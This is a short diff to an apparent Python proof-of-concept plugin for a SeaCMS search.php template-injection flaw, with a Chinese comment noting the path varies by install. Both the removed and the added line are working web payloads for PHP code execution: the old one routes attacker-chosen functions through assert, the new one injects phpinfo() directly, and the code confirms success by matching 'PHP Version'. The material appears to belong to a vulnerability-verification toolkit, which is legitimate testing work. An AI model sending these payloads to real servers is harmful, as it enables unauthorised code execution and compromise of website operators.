@@ -42,7 +42,7 @@ class Poc(ABPoc):
 
             #根据安装目录不同payload可能不同，需根据实际情况判断
             payload = '/seacms_upload/search.php?searchtype=5'
-            data = 'searchword=d&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=phpinfo();'
+            data = 'searchword=d&order=}{end if}{if:1)phpinfo();if(1}{end if}'
             url = self.target + payload
             r = requests.post(url, data=data)
             if 'PHP Version' in r.text:
